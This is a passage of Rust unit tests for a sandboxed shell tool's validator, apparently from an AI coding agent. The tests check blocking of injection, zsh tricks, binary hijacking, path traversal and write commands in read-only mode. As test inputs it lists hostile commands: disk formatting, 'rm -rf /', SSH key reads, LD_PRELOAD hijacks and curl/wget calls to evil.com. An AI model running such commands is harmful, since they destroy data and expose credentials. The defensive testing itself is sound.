        assert!(result.output.contains("sandbox_test"));
        // "sandboxed" flag is in display_output (richer UI representation)
        if let Some(ref display) = result.display_output {
            assert!(
                display.contains("\"sandboxed\":true") || display.contains("\"sandboxed\": true"),
                "display_output should contain sandboxed flag: {}", display
            );
        }
    }

    #[tokio::test]
    async fn rejects_mkfs_at_execute() {
        let tool = default_sandbox();
        let result = tool.execute(r#"{"command": "mkfs /dev/sda"}"#).await;
        assert!(!result.success);
        assert!(result.output.contains("SANDBOX BLOCKED"));
    }

    #[test]
    fn eval_regex_blocks_eval_command() {
        let tool = default_sandbox();
        assert!(tool.validate_command("eval $(cat script.sh)").is_err());
        assert!(tool.validate_command(r#"bash -c "eval something""#).is_err());
    }

    #[test]
    fn eval_regex_allows_evaluate_and_similar() {
        let tool = default_sandbox();
        assert!(tool.validate_command("python3 evaluate_model.py").is_ok());
        assert!(tool.validate_command("cargo test -- test_evaluate").is_ok());
        assert!(tool.validate_command("echo 'retrieval system'").is_ok());
        assert!(tool.validate_command("node evaluation.js").is_ok());
    }

    #[test]
    fn ssh_regex_blocks_actual_ssh_paths() {
        let tool = default_sandbox();
        assert!(tool.validate_command("cat ~/.ssh/id_rsa").is_err());
        assert!(tool.validate_command("ls .ssh/config").is_err());
    }

    #[test]
    fn ssh_regex_allows_non_ssh_paths() {
        let tool = default_sandbox();
        assert!(tool.validate_command("cat docs/openssh-guide.md").is_ok());
    }

    #[tokio::test]
    async fn background_command_returns_pid() {
        let tool = default_sandbox();
        let result = tool.execute(r#"{"command": "sleep 0.1", "is_background": true}"#).await;
        assert!(result.success, "background command should succeed: {}", result.output);
        assert!(
            result.output.contains("\"background\":true") || result.output.contains("\"background\": true"),
            "output should indicate background: {}", result.output
        );
        assert!(
            result.output.contains("\"pid\""),
            "output should include PID: {}", result.output
        );
    }

    #[tokio::test]
    async fn foreground_command_returns_signal_field() {
        let tool = default_sandbox();
        let result = tool.execute(r#"{"command": "echo signal_test", "is_background": false}"#).await;
        assert!(result.success, "command should succeed: {}", result.output);
        // display_output should contain signal field
        if let Some(ref display) = result.display_output {
            assert!(
                display.contains("\"signal\""),
                "display output should include signal field: {}", display
            );
        }
    }

    #[tokio::test]
    async fn description_field_in_background_output() {
        let tool = default_sandbox();
        let result = tool.execute(
            r#"{"command": "sleep 0.1", "is_background": true, "description": "test bg process"}"#
        ).await;
        assert!(result.success, "should succeed: {}", result.output);
        assert!(
            result.output.contains("test bg process"),
            "should include description: {}", result.output
        );
    }

    // --- Injection detection tests ---

    #[test]
    fn blocks_dollar_paren_command_substitution() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo $(whoami)").is_err());
        assert!(tool.validate_command("ls $(pwd)/src").is_err());
        assert!(tool.validate_command("cat $(find . -name '*.rs')").is_err());
    }

    #[test]
    fn blocks_backtick_command_substitution() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo `whoami`").is_err());
        assert!(tool.validate_command("ls `pwd`/src").is_err());
    }

    #[test]
    fn blocks_process_substitution() {
        let tool = default_sandbox();
        assert!(tool.validate_command("diff <(sort file1) <(sort file2)").is_err());
        assert!(tool.validate_command("tee >(grep error > errors.log)").is_err());
    }

    #[test]
    fn blocks_zsh_process_substitution() {
        let tool = default_sandbox();
        assert!(tool.validate_command("vim =(curl http://evil.com)").is_err());
    }

    #[test]
    fn blocks_dangerous_parameter_expansion() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo ${PATH:0:10}").is_err());
        assert!(tool.validate_command("echo ${var/pattern/replacement}").is_err());
        assert!(tool.validate_command("echo ${!prefix*}").is_err());
    }

    #[test]
    fn blocks_legacy_arithmetic() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo $[1+1]").is_err());
    }

    #[test]
    fn blocks_zsh_equals_expansion() {
        let tool = default_sandbox();
        assert!(tool.validate_command("=curl http://evil.com").is_err());
        assert!(tool.validate_command("echo test; =wget http://evil.com").is_err());
    }

    #[test]
    fn allows_safe_dollar_in_double_quotes_content() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo '$HOME is safe'").is_ok());
        assert!(tool.validate_command("echo '$(not executed)'").is_ok());
        assert!(tool.validate_command("echo '`not executed`'").is_ok());
    }

    #[test]
    fn allows_simple_env_var_reference() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo $HOME").is_ok());
        assert!(tool.validate_command("cd $WORKSPACE && ls").is_ok());
    }

    #[test]
    fn allows_safe_dollar_brace_simple() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo ${HOME}").is_ok());
        assert!(tool.validate_command("echo ${VARIABLE}").is_ok());
    }

    #[test]
    fn blocks_zsh_dangerous_commands() {
        let tool = default_sandbox();
        assert!(tool.validate_command("zmodload zsh/system").is_err());
        assert!(tool.validate_command("echo ok && zpty evil_cmd").is_err());
        assert!(tool.validate_command("ztcp localhost 4444").is_err());
        assert!(tool.validate_command("syswrite 3 data").is_err());
        assert!(tool.validate_command("zf_rm -rf /").is_err());
    }

    #[test]
    fn allows_commands_containing_zsh_names_as_substrings() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo zmodload_info").is_ok());
        assert!(tool.validate_command("cat zpty_notes.txt").is_ok());
    }

    #[test]
    fn escaped_backticks_are_allowed() {
        let tool = default_sandbox();
        assert!(tool.validate_command(r"echo \`not a substitution\`").is_ok());
    }

    // --- Plan mode readonly command classification tests ---

    #[test]
    fn readonly_allows_ls_cat_grep() {
        assert!(super::validate_readonly_command("ls -la").is_ok());
        assert!(super::validate_readonly_command("cat README.md").is_ok());
        assert!(super::validate_readonly_command("grep -r 'TODO' src/").is_ok());
        assert!(super::validate_readonly_command("head -n 10 file.txt").is_ok());
        assert!(super::validate_readonly_command("wc -l *.rs").is_ok());
    }

    #[test]
    fn readonly_allows_git_readonly_subcommands() {
        assert!(super::validate_readonly_command("git status").is_ok());
        assert!(super::validate_readonly_command("git log --oneline -10").is_ok());
        assert!(super::validate_readonly_command("git diff HEAD~1").is_ok());
        assert!(super::validate_readonly_command("git show HEAD").is_ok());
        assert!(super::validate_readonly_command("git branch -a").is_ok());
    }

    #[test]
    fn readonly_blocks_git_write_subcommands() {
        assert!(super::validate_readonly_command("git commit -m 'msg'").is_err());
        assert!(super::validate_readonly_command("git push origin main").is_err());
        assert!(super::validate_readonly_command("git reset --hard").is_err());
        assert!(super::validate_readonly_command("git checkout -b new").is_err());
    }

    #[test]
    fn readonly_allows_cargo_readonly() {
        assert!(super::validate_readonly_command("cargo check").is_ok());
        assert!(super::validate_readonly_command("cargo clippy").is_ok());
        assert!(super::validate_readonly_command("cargo test").is_ok());
        assert!(super::validate_readonly_command("cargo tree").is_ok());
    }

    #[test]
    fn readonly_blocks_cargo_write() {
        assert!(super::validate_readonly_command("cargo install foo").is_err());
        assert!(super::validate_readonly_command("cargo add serde").is_err());
        assert!(super::validate_readonly_command("cargo publish").is_err());
    }

    #[test]
    fn readonly_blocks_output_redirection() {
        assert!(super::validate_readonly_command("echo hello > file.txt").is_err());
        assert!(super::validate_readonly_command("cat x >> output.log").is_err());
    }

    #[test]
    fn readonly_allows_pipes() {
        assert!(super::validate_readonly_command("cat file.txt | grep error | wc -l").is_ok());
        assert!(super::validate_readonly_command("find . -name '*.rs' | head -20").is_ok());
    }

    #[test]
    fn readonly_validates_all_chain_segments() {
        assert!(super::validate_readonly_command("ls && cat file.txt").is_ok());
        assert!(super::validate_readonly_command("ls && rm file.txt").is_err());
        assert!(super::validate_readonly_command("git status; git push").is_err());
    }

    #[test]
    fn readonly_blocks_rm_mv_cp() {
        assert!(super::validate_readonly_command("rm file.txt").is_err());
        assert!(super::validate_readonly_command("mv a.txt b.txt").is_err());
        assert!(super::validate_readonly_command("cp src dst").is_err());
    }

    #[test]
    fn readonly_blocks_sed_in_place() {
        assert!(super::validate_readonly_command("sed -i 's/old/new/g' file").is_err());
        assert!(super::validate_readonly_command("sed 's/old/new/g' file").is_ok());
    }

    #[test]
    fn readonly_allows_npm_readonly() {
        assert!(super::validate_readonly_command("npm list").is_ok());
        assert!(super::validate_readonly_command("npm test").is_ok());
        assert!(super::validate_readonly_command("npm run lint").is_ok());
    }

    #[test]
    fn readonly_blocks_npm_write() {
        assert!(super::validate_readonly_command("npm install express").is_err());
        assert!(super::validate_readonly_command("npm publish").is_err());
    }

    // --- Path safety validation tests ---

    #[test]
    fn path_blocks_traversal_attempt() {
        let allowed = vec!["/home/user/project".to_string()];
        assert!(super::validate_command_paths("rm ../../etc/passwd", &allowed).is_err());
        assert!(super::validate_command_paths("mv ../../../secret.txt here", &allowed).is_err());
        assert!(super::validate_command_paths("touch ..", &allowed).is_err());
    }

    #[test]
    fn path_blocks_sensitive_home_ssh() {
        let home = dirs::home_dir().unwrap();
        let ssh_path = format!("rm {}/.ssh/id_rsa", home.display());
        assert!(super::validate_command_paths(&ssh_path, &[]).is_err());
    }

    #[test]
    fn path_blocks_sensitive_home_bashrc() {
        let home = dirs::home_dir().unwrap();
        let bashrc = format!("mv {0}/.bashrc {0}/.bashrc.bak", home.display());
        assert!(super::validate_command_paths(&bashrc, &[]).is_err());
    }

    #[test]
    fn path_blocks_sensitive_tilde_paths() {
        assert!(super::validate_command_paths("rm ~/.ssh/known_hosts", &[]).is_err());
        assert!(super::validate_command_paths("cp evil ~/.gnupg/gpg.conf", &[]).is_err());
        assert!(super::validate_command_paths("touch ~/.bashrc", &[]).is_err());
    }

    #[test]
    fn path_allows_normal_workspace_files() {
        let allowed = vec!["/home/user/project".to_string()];
        // cat/grep are read-only commands, not in PATH_WRITE_COMMANDS, so they pass
        assert!(super::validate_command_paths("cat /home/user/project/file.txt", &allowed).is_ok());
        assert!(super::validate_command_paths("grep -r TODO src/", &allowed).is_ok());
    }

    #[test]
    fn path_blocks_write_outside_allowed_dirs() {
        let allowed = vec!["/home/user/project".to_string()];
        assert!(super::validate_command_paths("rm /tmp/secret", &allowed).is_err());
        assert!(super::validate_command_paths("touch /etc/crontab", &allowed).is_err());
    }

    #[test]
    fn path_skips_validation_for_read_commands() {
        let allowed = vec!["/home/user/project".to_string()];
        // Read commands (cat, ls, grep) don't have path restrictions beyond OS perms
        assert!(super::validate_command_paths("cat /etc/passwd", &allowed).is_ok());
        assert!(super::validate_command_paths("ls /var/log", &allowed).is_ok());
    }

    #[test]
    fn path_validates_all_segments_in_chain() {
        let allowed = vec!["/home/user/project".to_string()];
        assert!(super::validate_command_paths(
            "ls /home/user/project && rm /tmp/evil",
            &allowed
        ).is_err());
    }

    #[test]
    fn path_no_false_positive_on_quoted_content() {
        assert!(super::validate_command_paths(
            "echo 'rm ~/.ssh/id_rsa'",
            &[]
        ).is_ok());
    }

    #[test]
    fn path_allows_write_in_workspace_when_allowed() {
        let tmp = std::env::temp_dir();
        let allowed = vec![tmp.to_string_lossy().to_string()];
        let cmd = format!("touch {}/test.txt", tmp.display());
        assert!(super::validate_command_paths(&cmd, &allowed).is_ok());
    }

    // --- Permission rule engine tests ---

    #[test]
    fn rule_exact_match() {
        let rule = super::PermissionRule::parse("git status");
        assert!(rule.matches("git status"));
        assert!(!rule.matches("git push"));
        assert!(!rule.matches("git status --short"));
    }

    #[test]
    fn rule_prefix_match() {
        let rule = super::PermissionRule::parse("git:*");
        assert!(rule.matches("git status"));
        assert!(rule.matches("git push origin main"));
        assert!(rule.matches("git"));
        assert!(!rule.matches("gitk"));
    }

    #[test]
    fn rule_wildcard_match() {
        let rule = super::PermissionRule::parse("docker * run");
        assert!(rule.matches("docker compose run"));
        assert!(rule.matches("docker stack run"));
        assert!(!rule.matches("docker ps"));
    }

    #[test]
    fn rule_wildcard_escaped_star() {
        let rule = super::PermissionRule::parse(r"echo \*");
        assert!(rule.matches("echo *"));
        assert!(!rule.matches("echo hello"));
    }

    #[test]
    fn strip_wrappers_timeout() {
        assert_eq!(super::strip_safe_wrappers("timeout 10 ls -la"), "ls -la");
        assert_eq!(super::strip_safe_wrappers("timeout -k 5 10 npm test"), "npm test");
    }

    #[test]
    fn strip_wrappers_nice_nohup() {
        assert_eq!(super::strip_safe_wrappers("nice -n 10 cargo build"), "cargo build");
        assert_eq!(super::strip_safe_wrappers("nohup python3 server.py"), "python3 server.py");
    }

    #[test]
    fn strip_wrappers_env_vars() {
        assert_eq!(super::strip_safe_wrappers("GOOS=linux cargo build"), "cargo build");
        assert_eq!(super::strip_safe_wrappers("NODE_ENV=test npm test"), "npm test");
    }

    #[test]
    fn strip_wrappers_preserves_binary_hijack() {
        // PATH= should NOT be stripped — it's preserved so hijack check catches it
        let result = super::strip_safe_wrappers("PATH=/evil cargo build");
        assert!(result.starts_with("PATH=") || result.contains("PATH="));
    }

    #[test]
    fn binary_hijack_detected() {
        assert!(super::has_binary_hijack_prefix("PATH=/evil/bin ls").is_some());
        assert!(super::has_binary_hijack_prefix("LD_PRELOAD=./evil.so ls").is_some());
        assert!(super::has_binary_hijack_prefix("LD_LIBRARY_PATH=/evil ls").is_some());
    }

    #[test]
    fn binary_hijack_not_triggered_for_safe_vars() {
        assert!(super::has_binary_hijack_prefix("GOOS=linux cargo build").is_none());
        assert!(super::has_binary_hijack_prefix("NODE_ENV=test npm test").is_none());
    }

    #[test]
    fn sandbox_blocks_wrapped_denied_command() {
        let mut config = super::ShellSandboxConfig::default();
        config.denied_commands.push("rm".into());
        let tool = super::SandboxedShellTool::new(config);
        // "nohup rm -rf /" should be caught even though "nohup" isn't denied
        assert!(tool.validate_command("nohup rm -rf /").is_err());
    }

    #[test]
    fn sandbox_blocks_env_prefixed_denied_command() {
        let mut config = super::ShellSandboxConfig::default();
        config.denied_commands.push("rm".into());
        let tool = super::SandboxedShellTool::new(config);
        assert!(tool.validate_command("FORCE=1 rm -rf /").is_err());
    }

    #[test]
    fn sandbox_blocks_binary_hijack() {
        let tool = default_sandbox();
        assert!(tool.validate_command("PATH=/evil ls").is_err());
        assert!(tool.validate_command("LD_PRELOAD=./evil.so cat /etc/passwd").is_err());
    }

    // --- Namespace isolation tests ---

    #[test]
    fn namespace_available_returns_bool() {
        // Just verify it doesn't panic; actual availability depends on system
        #[cfg(not(windows))]
        let _ = super::namespace_available();
    }

    #[test]
    fn shell_quote_handles_special_chars() {
        assert_eq!(super::shell_quote("hello"), "'hello'");
        assert_eq!(super::shell_quote("it's"), "'it'\\''s'");
        assert_eq!(super::shell_quote("a b"), "'a b'");
    }

    #[test]
    #[cfg(not(windows))]
    fn namespace_command_not_built_when_disabled() {
        let config = super::ShellSandboxConfig::default();
        let tool = super::SandboxedShellTool::new(config);
        assert!(tool.build_namespace_command("ls", "bash").is_none());
    }

    #[test]
    #[cfg(not(windows))]
    fn namespace_setup_script_includes_mounts() {
        let mut config = super::ShellSandboxConfig::default();
        config.use_namespace = true;
        config.readonly_paths = vec!["/usr".into(), "/lib".into()];
        config.writable_paths = vec!["/tmp".into()];
        let tool = super::SandboxedShellTool::new(config);
        let script = tool.build_namespace_setup_script("echo ok", "bash");
        assert!(script.contains("mount --make-rprivate /"));
        assert!(script.contains("/usr"));
        assert!(script.contains("remount,bind,ro"));
        assert!(script.contains("/tmp"));
        assert!(script.contains("echo ok"));
    }

    #[test]
    fn config_new_fields_default_correctly() {
        let config = super::ShellSandboxConfig::default();
        assert!(!config.isolate_network);
        assert!(config.writable_paths.is_empty());
        assert!(config.allowed_hosts.is_empty());
    }

    // --- sed → EditFile conversion tests ---

    #[test]
    fn sed_parse_simple_substitution() {
        let info = super::parse_sed_edit("sed -i 's/old/new/g' file.txt").unwrap();
        assert_eq!(info.file_path, "file.txt");
        assert_eq!(info.pattern, "old");
        assert_eq!(info.replacement, "new");
        assert_eq!(info.flags, "g");
    }

    #[test]
    fn sed_parse_no_flags() {
        let info = super::parse_sed_edit("sed -i 's/foo/bar/' config.yml").unwrap();
        assert_eq!(info.pattern, "foo");
        assert_eq!(info.replacement, "bar");
        assert_eq!(info.flags, "");
    }

    #[test]
    fn sed_parse_different_delimiter() {
        let info = super::parse_sed_edit("sed -i 's|/usr/local|/opt|g' paths.conf").unwrap();
        assert_eq!(info.pattern, "/usr/local");
        assert_eq!(info.replacement, "/opt");
        assert_eq!(info.flags, "g");
    }

    #[test]
    fn sed_parse_with_backup_suffix() {
        let info = super::parse_sed_edit("sed -i.bak 's/old/new/' file.txt").unwrap();
        assert_eq!(info.file_path, "file.txt");
    }

    #[test]
    fn sed_parse_returns_none_without_i() {
        assert!(super::parse_sed_edit("sed 's/old/new/g' file.txt").is_none());
    }

    #[test]
    fn sed_parse_returns_none_for_non_sed() {
        assert!(super::parse_sed_edit("grep 'pattern' file.txt").is_none());
    }

    #[test]
    fn sed_parse_returns_none_for_delete_command() {
        assert!(super::parse_sed_edit("sed -i '/pattern/d' file.txt").is_none());
    }

    #[test]
    fn sed_to_edit_generates_suggestion() {
        let info = super::SedEditInfo {
            file_path: "src/main.rs".into(),
            pattern: "old_func".into(),
            replacement: "new_func".into(),
            flags: "g".into(),
        };
        let suggestion = super::sed_to_edit_suggestion(&info);
        assert!(suggestion.contains("edit_file"));
        assert!(suggestion.contains("src/main.rs"));
        assert!(suggestion.contains("old_func"));
        assert!(suggestion.contains("new_func"));
    }

    #[test]
    fn sed_parse_escaped_delimiter() {
        let info = super::parse_sed_edit(r"sed -i 's/foo\/bar/baz/' file.txt").unwrap();
        assert_eq!(info.pattern, r"foo\/bar");
        assert_eq!(info.replacement, "baz");
    }
}
